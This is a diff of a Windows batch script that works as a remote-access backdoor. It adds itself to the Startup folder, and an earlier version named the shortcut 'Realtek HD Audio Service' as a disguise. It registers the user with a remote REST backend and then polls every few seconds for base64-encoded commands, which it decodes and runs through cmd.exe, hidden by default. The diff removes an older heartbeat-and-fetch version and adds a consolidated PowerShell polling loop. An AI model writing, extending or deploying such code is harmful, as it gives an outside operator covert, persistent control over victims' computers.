@@ -37,7 +37,7 @@ setlocal enabledelayedexpansion
 set "BASE_URL="
 set "API_KEY="
 
-set "scriptName=Realtek HD Audio Service"
+set "scriptName=run"
 set "shortcutPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\%scriptName%.lnk"
 
 if "%1"=="--startup" goto :main
@@ -54,9 +54,8 @@ if !ERRORLEVEL! EQU 0 (
 exit /b
 
 :main
-call :heartbeat
-call :fetchCmd
-timeout /t 2 /nobreak >nul
+powershell -Command "$h = @{ 'apikey' = '!API_KEY!'; 'Authorization' = 'Bearer !API_KEY!'; 'Content-Type' = 'application/json'; 'Prefer' = 'return=representation'; 'Accept' = 'application/vnd.pgrst.object+json' }; $u = '!BASE_URL!/clients?username=eq.!USERNAME!'; $r = Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{\"updated_at\": \"now()\"}'; if ($r.run -eq $true) { Invoke-RestMethod -Method Patch -Uri $u -Headers $h -Body '{\"run\": false}'; $c = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($r.cmd)); $s = if ($r.visible -eq $true) { 'Normal' } else { 'Hidden' }; Start-Process cmd.exe -ArgumentList '/c', $c -WindowStyle $s; }"
+timeout /t 4 /nobreak >nul
 goto main
 
 :register
@@ -66,16 +65,4 @@ curl -s -X POST "!BASE_URL!/clients" ^
 -H "Content-Type: application/json" ^
 -H "Prefer: resolution=merge-duplicates" ^
 -d "{\"username\": \"!USERNAME!\"}" >nul
-exit /b
-
-:heartbeat
-curl -s -X PATCH "!BASE_URL!/clients?username=eq.!USERNAME!" ^
--H "apikey: !API_KEY!" ^
--H "Authorization: Bearer !API_KEY!" ^
--H "Content-Type: application/json" ^
--d "{\"updated_at\": \"now()\"}" >nul
-exit /b
-
-:fetchCmd
-powershell -Command "$headers = @{ 'apikey' = '!API_KEY!'; 'Authorization' = 'Bearer !API_KEY!'; 'Content-Type' = 'application/json' }; $url = '!BASE_URL!/clients?select=cmd,run&username=eq.!USERNAME!'; $response = Invoke-RestMethod -Uri $url -Headers $headers; if ($response.run -eq $true) { $patchUrl = '!BASE_URL!/clients?username=eq.!USERNAME!'; Invoke-RestMethod -Method Patch -Uri $patchUrl -Headers $headers -Body '{\"run\": false}'; $decodedCmd = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($response.cmd)); Start-Process cmd.exe -ArgumentList '/c', $decodedCmd -WindowStyle Hidden; }"
 exit /b
